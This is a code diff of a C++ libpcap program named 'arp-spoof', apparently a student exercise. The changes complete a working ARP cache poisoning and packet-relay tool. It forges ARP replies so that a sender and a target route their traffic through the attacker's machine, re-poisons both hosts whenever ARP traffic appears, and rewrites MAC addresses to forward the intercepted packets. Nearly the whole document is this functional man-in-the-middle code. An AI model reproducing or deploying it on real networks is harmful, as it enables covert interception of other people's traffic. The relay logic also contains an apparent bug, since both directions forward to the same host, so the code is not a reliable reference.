@@ -22,7 +22,6 @@ struct ArpInfo{
     Ip ip_;
 };
 
-
 void usage() {
     printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
     printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
@@ -94,18 +93,16 @@ void send_arp_packet(pcap_t * handle, EthArpPacket * packet){
 }
 
 void infect_arp_table(pcap_t * handle, ArpInfo* sender, ArpInfo* I, char * ip, Ip target){
-    // 브로드 캐스트를 보내고 (arp request) 이를 잡아서 정보를 업데이트. 업데이트 하는 시점은 , 인자로 주어진 ip에 대한 정보가 존재하지 않을때?(key-value)로 저장해야하나?
     EthArpPacket arp_packet;
     Mac smac = Mac("FF:FF:FF:FF:FF:FF");
     Ip sip = Ip(ip);
 
     make_arp_packet(&arp_packet, I->mac_, I->ip_, smac, sip, ArpHdr::Request);
     send_arp_packet(handle, &arp_packet);
-    printf("1...\n");
     while(true){
         struct pcap_pkthdr* header;
         const u_char* packet;
-        int res = pcap_next_ex(handle, &header, &packet); // 잡은 패킷에 대해 맥이랑 ip만 바꿔주면 된다
+        int res = pcap_next_ex(handle, &header, &packet); 
         if (res == 0) continue;
         if (res == -1 || res == -2) {
             printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
@@ -114,18 +111,16 @@ void infect_arp_table(pcap_t * handle, ArpInfo* sender, ArpInfo* I, char * ip, I
 
         EthArpPacket * arp_reply_packet = (EthArpPacket *)packet;
 
-        if(arp_reply_packet->eth_.type() == EthHdr::Arp){ // arp_reply_packet->arp_.op() == ArpHdr::Reply) {
+        if(arp_reply_packet->eth_.type() == EthHdr::Arp){
             memcpy(&arp_packet, arp_reply_packet, sizeof(EthArpPacket));
             break;
         }
-        printf("2...\n");
     }
     sender->mac_ = arp_packet.eth_.smac_;
     sender->ip_ = arp_packet.arp_.sip();
 
     make_arp_packet(&arp_packet, I->mac_, target, sender->mac_, sender->ip_, ArpHdr::Reply);
     send_arp_packet(handle, &arp_packet);
-    printf("3...\n");
 }
 
 bool check_arp_packet(const u_char* packet){
@@ -137,9 +132,10 @@ bool check_arp_packet(const u_char* packet){
     return false;
 }
 
-void relay_packet(pcap_t * handle, const u_char* packet, ArpInfo I, bpf_u_int32 caplen){
+void relay_packet(pcap_t * handle, const u_char* packet, ArpInfo I, bpf_u_int32 caplen, ArpInfo dst){
     printf("Packet Relay...\n");
     memcpy((u_char *) (packet + 6), &(I.mac_), 6);
+    memcpy((u_char*)packet, &(dst.mac_), 6);
     printf("%02X:%02X:%02X:%02X:%02X:%02X\n", packet[6], packet[7], packet[8], packet[9], packet[10], packet[11]);
     int res = pcap_inject(handle, reinterpret_cast<const uint8_t *>(packet), caplen);
     printf("packet inject: %d bytes\n", res);
@@ -149,43 +145,37 @@ void relay_packet(pcap_t * handle, const u_char* packet, ArpInfo I, bpf_u_int32 
 
 }
 
+void update_arp_table(pcap_t * handle, ArpInfo sender, ArpInfo target, ArpInfo attacker){
+    EthArpPacket packet;
+    make_arp_packet(&packet, attacker.mac_, target.ip_, sender.mac_, sender.ip_, ArpHdr::Reply);
+    send_arp_packet(handle, &packet);
 
-
-void update_arp_table(ArpInfo sender, ArpInfo target, ArpInfo attacker){ // reply 패킷만 보내는 용도!!
-    //make_arp_packet();
-    //send_arp_packet();
-    //make_arp_packet();
-    //send_arp_packet();
+    memset(&packet, 0, sizeof(packet));
+    make_arp_packet(&packet, attacker.mac_, sender.ip_, target.mac_, target.ip_, ArpHdr::Reply);
+    send_arp_packet(handle, &packet);
 }
-
-void print_ip(uint32_t ip){
-    uint8_t to[4];
-    memcpy(to, &ip, 4);
-    printf("%u.%u.%u.%u\n", to[0],to[1],to[2],to[3]);
-}
-
 
 int main(int argc, char * argv[]) {
-    if(argc < 3 || argc % 2 != 0){
+    if(argc < 3){
         usage();
         return -1;
     }
 
     char* dev = argv[1];
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf); //1
     if(handle == nullptr){
         fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
         return -1;
     }
-    map<Ip,Mac> ArpTable;
 
+    // Get my mac and ip
     ArpInfo I;
     get_my_mac(argv[1], I.mac_);
-    // 고쳐야 할 곳 ********
     char ip_buffer[18];
     get_my_ip(argv[1], ip_buffer);
     I.ip_ = Ip(ip_buffer);
+    printf("Get My Mac & Ip Success...\n");
 
     EthArpPacket arp_packet;
     ArpInfo sender;
@@ -195,14 +185,14 @@ int main(int argc, char * argv[]) {
     Ip temp2 = Ip(argv[5]);
 
     infect_arp_table(handle, &sender, &I, argv[2], temp1);
-    printf("where is...\n");
     infect_arp_table(handle, &target, &I, argv[4], temp2);
+
     printf("Infect Arp Table Success...\n");
 
-    while(true){
-        struct pcap_pkthdr* header;
-        const u_char* packet;
-        int res = pcap_next_ex(handle, &header, &packet); // 잡은 패킷에 대해 맥이랑 ip만 바꿔주면 된다
+    while(true) {
+        struct pcap_pkthdr *header;
+        const u_char *packet;
+        int res = pcap_next_ex(handle, &header, &packet);
         if (res == 0) continue;
         if (res == -1 || res == -2) {
             printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
@@ -211,39 +201,26 @@ int main(int argc, char * argv[]) {
 
         if(check_arp_packet(packet)){
             printf("Capture Arp Packet...\n");
-            //update_arp_table
+            update_arp_table(handle, sender, target, I);
             continue;
         }
-        uint32_t check_ip;
 
-        memcpy(&check_ip, (packet + 26), 4); //ip의 위치가 틀렸다!
-        //printf("Captured Packet IP:%s\n", inet_ntoa(check_ip));
-        printf("Packet IP: ");
-        print_ip(check_ip);
+        uint8_t type;
+        memcpy(&type, (packet + 23), 1);
+
+        uint32_t from_ip;
+        memcpy(&from_ip, (packet + 26), 4);
+
+        uint32_t to_ip;
+        memcpy(&to_ip, (packet + 30), 4);
+
         printf("Check Ip...\n");
-
-        if(htonl(check_ip) == sender.ip_ || htonl(check_ip) == target.ip_) // if ip is in arp_table
-            relay_packet(handle, packet, I, header->caplen); //센더 mac만 바꿔주면 된다.
-
+        if (ntohl(from_ip) == sender.ip_ || ntohl(to_ip) == target.ip_)
+            relay_packet(handle, packet, I, header->caplen, target);
+        if(ntohl(to_ip) == sender.ip_ || ntohl(from_ip) == target.ip_)
+            relay_packet(handle, packet, I, header->caplen, target);
     }
 
 
     pcap_close(handle);
-
-
 }
-
-
-
-
-/*
- 1. arp table attack(send-arp) sender & target 둘 다 감염
- 2. get spoofed packet
- 3. send relay packet
- 4. (In NAT, this is rare) target send to sender arp request(broadcast)
- 5. arp cache expired -> sender send arp request(broadcast)
- 6. sender send unicast
- 7. redo 1!!
-
- 그러나 여러 센더와 타겟을 관리해야 하는 어려움 존재한다.
- */
